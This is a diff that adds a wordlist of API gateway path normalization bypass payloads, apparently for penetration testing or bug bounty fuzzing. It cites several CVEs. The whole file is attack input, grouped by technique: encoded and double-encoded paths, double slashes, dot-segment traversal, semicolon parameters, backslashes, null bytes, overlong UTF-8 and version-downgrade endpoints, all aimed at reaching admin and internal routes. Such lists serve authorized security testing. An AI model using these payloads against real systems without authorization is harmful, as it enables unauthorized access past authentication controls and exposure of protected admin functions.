@@ -1,0 +1,154 @@
+# API Gateway Path Normalization Bypass Payloads
+# Research: Deep Research v4.0 - 2026-10
+# CVEs: CVE-2025-66202, CVE-2025-71399, CVE-2026-33186
+
+# ============================================================
+# TRAILING SLASH BYPASS (AWS HTTP API pattern - $12K bounty)
+# ============================================================
+/v1/accounts/
+/v1/users/
+/v1/admin/
+/api/v2/settings/
+/api/internal/config/
+/api/v1/transfers/
+/graphql/
+
+# ============================================================
+# DOUBLE ENCODING BYPASS (Astro CVE-2025-66202)
+# ============================================================
+# Single encoding
+/%61dmin
+/%75sers
+/%73ettings
+# Double encoding
+/%2561dmin
+/%2575sers
+/%2573ettings
+# Triple encoding (test iterative decode)
+/%252561dmin
+/%25252561dmin
+# Encoded slashes
+/api%2fadmin
+/api%2Fadmin
+/%2fapi%2fadmin
+/%252fapi%252fadmin
+
+# ============================================================
+# DOUBLE SLASH BYPASS (Better Auth CVE-2025-71399)
+# ============================================================
+//sign-in/email
+//api/auth/sign-in
+///sign-in/email
+//admin
+///admin
+//api/v1/users
+//internal/config
+////admin
+
+# ============================================================
+# DOT SEGMENT TRAVERSAL (MCP Python SDK pattern)
+# ============================================================
+/api/../admin/
+/api/../admin
+/api/v1/../../admin/
+/public/../admin/
+/allowed/../restricted/
+/api/%2e%2e/admin/
+/api/..%2fadmin/
+/api/%2e%2e%2fadmin/
+/api/%252e%252e/admin/
+/api/%252e%252e%252fadmin/
+
+# ============================================================
+# CASE MANIPULATION
+# ============================================================
+/Admin
+/ADMIN
+/aDmIn
+/AdMiN
+/API/ADMIN
+/Api/Users
+
+# ============================================================
+# SEMICOLON PATH PARAMETERS (Tomcat/Java)
+# ============================================================
+/admin;jsessionid=fake
+/admin;x=1
+/admin;.css
+/admin;.js
+/api/admin;foo=bar
+/restricted;jsessionid=anything/resource
+
+# ============================================================
+# BACKSLASH SUBSTITUTION (Windows backends)
+# ============================================================
+/api\..\admin
+/api\admin
+/api\..\..\/admin
+\admin
+\..\admin
+
+# ============================================================
+# NULL BYTE INJECTION (older systems)
+# ============================================================
+/allowed%00/../admin
+/api%00/admin
+/admin%00.html
+/admin%00.jpg
+
+# ============================================================
+# MIXED TECHNIQUE COMBINATIONS
+# ============================================================
+//api/../admin/%2e%2e/secret/
+/api/%2e%2e//admin/
+//api/..%2fadmin;x=1/
+/%2561dmin/
+/api/../%2561dmin/
+//api/%2e%2e/admin/
+
+# ============================================================
+# UNICODE NORMALIZATION
+# ============================================================
+# Full-width slash U+FF0F
+/api／admin
+# Full-width dot U+FF0E
+/api／．．／admin
+# Overlong UTF-8 encoded slash
+/api%c0%afadmin
+/api%e0%80%afadmin
+# Overlong UTF-8 encoded dot
+/api%c0%aeadmin
+
+# ============================================================
+# CONTENT-TYPE + PATH COMBO
+# ============================================================
+# Append file extensions to bypass type-based routing
+/admin.json
+/admin.xml
+/admin.html
+/admin.css
+/admin.js
+/admin.ico
+/admin.woff2
+
+# ============================================================
+# HTTP METHOD + PATH BYPASS
+# ============================================================
+# Test with different HTTP methods on protected paths
+# OPTIONS /admin (preflight may bypass)
+# HEAD /admin (different code path)
+# TRACE /admin (may echo headers)
+# PATCH /admin (alternative to PUT)
+# PROPFIND /admin (WebDAV may bypass)
+
+# ============================================================
+# VERSION DOWNGRADE PATHS (CVE-2026-23760)
+# ============================================================
+/api/v0/users
+/api/v1/users
+/api/beta/users
+/api/internal/users
+/api/legacy/users
+/api/v1/auth/force-reset-password
+/api/v0/admin/settings
+/api/internal/config
